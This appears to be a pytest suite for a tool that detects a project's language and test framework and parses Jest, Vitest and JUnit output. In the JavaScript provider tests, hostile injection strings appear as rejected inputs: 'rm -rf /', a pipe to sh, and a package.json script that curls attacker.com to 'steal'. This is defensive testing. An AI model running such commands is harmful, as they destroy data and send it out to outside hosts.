import pytest
from pathlib import Path
import json

from app.languages.base import LanguageProvider, CommonAnalysisResult
from app.languages.python_provider import PythonProvider
from app.languages.javascript_provider import JavaScriptProvider
from app.languages.java_provider import JavaProvider
from app.languages.registry import LanguageProviderRegistry
from app.parser import (
    JestOutputParser,
    VitestOutputParser,
    JUnitOutputParser,
    get_test_parser,
    PytestOutputParser,
)


def test_python_provider_detection(tmp_path: Path):
    (tmp_path / "pyproject.toml").write_text("[project]\nname = 'demo'\n", encoding="utf-8")
    (tmp_path / "test_sample.py").write_text("def test_one(): pass\n", encoding="utf-8")
    
    provider = PythonProvider()
    assert provider.detect(tmp_path) is True
    
    res = provider.analyze(tmp_path)
    assert res.language == "python"
    assert res.test_framework == "pytest"
    assert "pytest" in res.test_command
    assert any("test_sample.py" in p for p in res.test_files)


def test_javascript_provider_detection_and_security(tmp_path: Path):
    pkg_json = {
        "name": "js-demo",
        "scripts": {
            "test": "jest --runInBand"
        },
        "devDependencies": {
            "jest": "^29.0.0"
        }
    }
    (tmp_path / "package.json").write_text(json.dumps(pkg_json), encoding="utf-8")
    tests_dir = tmp_path / "tests"
    tests_dir.mkdir()
    (tests_dir / "app.test.js").write_text("test('runs', () => {});", encoding="utf-8")

    provider = JavaScriptProvider()
    assert provider.detect(tmp_path) is True

    res = provider.analyze(tmp_path)
    assert res.language == "javascript"
    assert res.test_framework == "jest"
    assert res.package_manager == "npm"
    assert "jest" in res.test_command

    # Test security validation - safe commands
    assert provider._is_safe_command("npm test") is True
    assert provider._is_safe_command("npx jest --runInBand") is True
    assert provider._is_safe_command("vitest run") is True

    # Test security validation - malicious command injection
    assert provider._is_safe_command("npm test; rm -rf /") is False
    assert provider._is_safe_command("curl http://malicious.com") is False
    assert provider._is_safe_command("powershell -Command Invoke-WebRequest") is False
    assert provider._is_safe_command("npx jest | sh") is False
    assert provider._is_safe_command("npx jest && whoami") is False


def test_javascript_provider_rejects_malicious_package_json(tmp_path: Path):
    # Malicious test script in package.json
    malicious_pkg = {
        "name": "malicious-repo",
        "scripts": {
            "test": "jest && curl http://attacker.com/steal"
        }
    }
    (tmp_path / "package.json").write_text(json.dumps(malicious_pkg), encoding="utf-8")
    
    provider = JavaScriptProvider()
    res = provider.analyze(tmp_path)
    # The provider should fall back to a safe default rather than executing malicious script
    assert "curl" not in res.test_command
    assert "jest" in res.test_command


def test_java_provider_detection(tmp_path: Path):
    (tmp_path / "pom.xml").write_text("<project></project>", encoding="utf-8")
    provider = JavaProvider()
    assert provider.detect(tmp_path) is True

    res = provider.analyze(tmp_path)
    assert res.language == "java"
    assert res.test_framework == "junit"


def test_language_registry_priority(tmp_path: Path):
    # Create mixed repository with package.json and pyproject.toml
    (tmp_path / "package.json").write_text(json.dumps({"name": "mixed", "scripts": {"test": "jest"}}), encoding="utf-8")
    (tmp_path / "pyproject.toml").write_text("[project]\nname = 'mixed'\n", encoding="utf-8")

    registry = LanguageProviderRegistry()

    # Explicit override takes absolute priority
    provider_py, explicit_py = registry.detect(tmp_path, explicit_language="python")
    assert explicit_py.language == "python"

    provider_js, explicit_js = registry.detect(tmp_path, explicit_language="javascript")
    assert explicit_js.language == "javascript"

    # Default detection prioritizes package.json > python config when package.json present
    provider_det, detected = registry.detect(tmp_path)
    assert detected.language == "javascript"


def test_jest_output_parser():
    jest_output = """
FAIL tests/calculator.test.js
  Calculator Operations
    ✓ adds numbers correctly (2 ms)
    ✓ subtracts numbers correctly (1 ms)
    ✓ multiplies numbers correctly (1 ms)
    ✕ divide handles zero count safely (4 ms)
    ✓ calculates percentage correctly (1 ms)

  ● Calculator Operations › divide handles zero count safely

    expect(received).toBe(expected) // Object.is equality

    Expected: 0
    Received: -1

      25 | test('divide handles zero count safely', () => {
      26 |   const result = divide(100, 0);
    > 27 |   expect(result).toBe(0);
         |                  ^
      28 | });

      at Object.toBe (tests/calculator.test.js:27:18)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 4 passed, 5 total
Snapshots:   0 total
Time:        0.589 s
Ran all test suites.
"""
    parser = JestOutputParser()
    result = parser.parse(jest_output, "", 1, 0.589)

    assert result.total == 5
    assert result.passed == 4
    assert result.failed == 1
    assert result.errors == 0

    failures = result.failures
    assert len(failures) == 1
    assert failures[0].test_name == "Calculator Operations › divide handles zero count safely"
    assert "Expected: 0" in failures[0].message
    assert "calculator.test.js" in failures[0].file


def test_vitest_output_parser():
    vitest_output = """
 ❯ tests/math.spec.ts (2)
   ✓ should add numbers
   × should divide by zero safely

 ⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
   Failed Tests 1
 ⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
   FAIL  tests/math.spec.ts > should divide by zero safely
   AssertionError: expected -1 to be 0
    ❯ tests/math.spec.ts:18:22

 Tests  1 failed | 1 passed (2)
 Duration  240ms
"""
    parser = VitestOutputParser()
    result = parser.parse(vitest_output, "", 1, 0.24)

    assert result.total == 2
    assert result.passed == 1
    assert result.failed == 1

    failures = result.failures
    assert len(failures) >= 1
    assert "divide by zero" in failures[0].test_name


def test_junit_output_parser():
    junit_output = """
[INFO] -------------------------------------------------------
[INFO]  T E S T S
[INFO] -------------------------------------------------------
[INFO] Running com.example.CalculatorTest
[ERROR] Tests run: 5, Failures: 1, Errors: 0, Skipped: 0, Time elapsed: 0.12 s <<< FAILURE! - in com.example.CalculatorTest
[ERROR] testDivideByZero(com.example.CalculatorTest)  Time elapsed: 0.01 s  <<< FAILURE!
java.lang.AssertionError: expected:<0> but was:<-1>
\tat com.example.CalculatorTest.testDivideByZero(CalculatorTest.java:24)

[INFO] Results:
[INFO] Tests run: 5, Failures: 1, Errors: 0, Skipped: 0
[INFO] BUILD FAILURE
"""
    parser = JUnitOutputParser()
    result = parser.parse(junit_output, "", 1, 0.12)

    assert result.total == 5
    assert result.passed == 4
    assert result.failed == 1

    failures = result.failures
    assert len(failures) == 1
    assert "testDivideByZero" in failures[0].test_name
    assert "AssertionError" in failures[0].error_type


def test_get_test_parser_factory():
    assert issubclass(get_test_parser("pytest"), PytestOutputParser)
    assert issubclass(get_test_parser("jest"), JestOutputParser)
    assert issubclass(get_test_parser("vitest"), VitestOutputParser)
    assert issubclass(get_test_parser("junit"), JUnitOutputParser)
